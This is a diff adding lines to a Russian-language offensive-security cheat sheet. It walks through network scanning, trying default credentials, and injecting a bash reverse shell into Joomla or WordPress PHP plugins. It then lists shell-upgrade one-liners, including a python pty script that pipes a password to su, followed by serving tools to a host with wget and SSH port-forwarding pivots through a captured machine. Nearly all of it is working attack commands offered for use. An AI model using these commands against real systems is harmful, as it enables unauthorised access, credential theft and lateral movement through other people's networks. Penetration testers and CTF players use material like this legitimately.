@@ -1,3 +1,5 @@
+https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
+
 1. Первичное сканирование при попадании в сеть:
 nmap -sn 192.168.0.0/24 (быстрый скан какие есть машины без проверки открытых портов)
 nmap 10.10.234.3 (Просто скан с проверкой портов)
@@ -8,21 +10,34 @@ curl 10.10.234.3 -Iv (или lv)
 Потом адрес с именем можно добавить себе в /etc/hosts
 
 Ищем дефолтные креды. Каждый раз когда видим нового пользователя - перебираем все известные пароли для попытки входа.
+Если у нас есть php - в графе Local File Inclusion: Reading Files описано как прочитать исходники
 
 Если у нас есть доступ к .php плагинам Joomla/Wordpress - добавляем в них
 system("/bin/bash -i >& /dev/tcp/наш адрес/4444 0>&1")
 После чего обращаемся к плагину и получаем reverse shell.
 
+Если наш шелл какой-то мутный - можно попробовать вот так:
+nice /bin/bash
+/usr/bin/expect sh
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+/bin/busybox sh
+python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
+
 Один ищет на хосте, второй же параллельно забрасывает на хост nmap и исследует дальше
 Чтобы забросить nmap делаем:
 python3 -m http.server 8080 -d /home/user-1/Desktop/ (или другая папка где лежит подготовленный к работе nmap)
-wget наш_адрес/файл  // curl
+wget наш_адрес/файл  // curl   URT4
+
+Сканы:
+target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
 
 Если нам уже доступен ssh (любым способом попали в ssh оболочку), то мы можем выполнить проксирование дальше с использованием:
 ssh -L local_ip:local_port:remote_ip:remote_port remote_user@victim-IP
 (Например - ssh -L 10.10.10.1:8000:127.0.0.1:8080 user-1@10.10.10.2)
 Более того, теперь перейдя по адресу атакуемого мы сможем увидеть его сайт, который висит на 127.0.0.1 (если таковой имеется)
 Именно вышеописанная команда позволяет видеть все что на 127.0.0.1
+Не забывайте менять конфиг ssh на захваченном хосте GatewayPorts yes
+Либо указываем -g -L (делает лупбэк)
 
 Если же сайты нам не нужны, можем сделать так:
 ssh user-1@10.10.10.2 -L 8000:127.0.0.1:8080
